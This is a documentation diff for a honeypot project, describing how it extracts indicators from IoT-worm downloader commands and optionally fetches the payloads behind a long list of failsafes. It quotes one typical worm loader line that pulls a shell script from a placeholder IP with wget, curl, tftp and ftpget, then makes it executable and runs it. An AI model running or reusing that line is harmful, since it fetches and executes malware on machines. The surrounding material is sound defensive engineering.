@@ -677,6 +677,64 @@ a CDN. A blank page after an update is a stale cached script — hard-refresh
 script, a base64 blob. It is the most valuable thing they give up, and the most
 dangerous thing to have on disk. The design keeps those two facts apart.
 
+### Second-stage loaders (and the optional fetch)
+
+Most worms that reach the fake shell never upload anything. They run a
+*downloader*:
+
+```
+cd /tmp || cd /var/run; wget http://198.51.100.9/nz.sh;
+curl -O http://198.51.100.9/nz.sh; chmod 777 nz.sh; sh nz.sh;
+tftp 198.51.100.9 -c get nz.sh; ftpget -v -u anonymous -p anonymous
+-P 21 198.51.100.9 2.sh 2.sh
+```
+
+Nothing transfers, because the box cannot reach out. So there is no file, no
+hash and nothing for VirusTotal — which for a long time meant the most common
+thing this honeypot sees produced no artefact at all.
+
+What it *does* produce is the retrieval chain: an address, a port, a path, and
+four transports tried in order. **That is always extracted, needs no
+configuration, and works with no egress.** Each target becomes a record under
+`storage/ioc/` keyed on scheme, host, port and path, accumulating how often it
+was seen and which addresses used it; a `LOADER_URL` event scores it; the
+attacker profile grows a **Second-stage loaders** table; and `loaders.csv`
+joins every evidence bundle. Four records come out of the line above.
+
+**Optionally**, the `intel` container will go and fetch the file:
+
+```bash
+# .env
+FETCH_ENABLED=true
+```
+
+That is off by default and should stay off until you have decided three things.
+Your address contacts theirs, and a loader host that sees a fetch from a machine
+it just "infected" learns it found a honeypot. They choose what you receive.
+And you will be storing live malware, which is a conversation to have with your
+provider before the samples arrive rather than after ([§2.1](AUTHORIZATION.md)).
+
+No honeypot gains a route out either way. They write the IOC to the shared
+volume; `intel` — already the only container with egress, and on no network any
+honeypot can reach — reads it. Failsafes fire in this order:
+
+| | |
+|---|---|
+| `FETCH_ENABLED` | Off by default |
+| Scheme allowlist | `http`/`https` only. tftp and ftp are recorded, never fetched |
+| Resolution | Done in the fetcher, not trusted from the record |
+| Address check | **Every** resolved address must be publicly routable — one answer pointing at `169.254.169.254` refuses the whole fetch |
+| Redirects | Refused, not followed |
+| Timeout | `FETCH_TIMEOUT`, default 8s |
+| Size cap | `FETCH_MAX_BYTES`, enforced while streaming, so a lying `Content-Length` changes nothing |
+| Per-host cooldown | `FETCH_HOST_COOLDOWN`, default 1h |
+| Rate limit | `FETCH_MAX_PER_HOUR`, default 20 |
+| Circuit breaker | Ten consecutive failures stops fetching entirely |
+| Storage cap | `loot.capture` refuses past `MAX_TOTAL_MB` |
+| At rest | Mode 0400, `.bin` suffix, never executed |
+
+Anything captured flows into the existing VirusTotal hash lookup unchanged.
+
 ### The path a payload takes
 
 ```
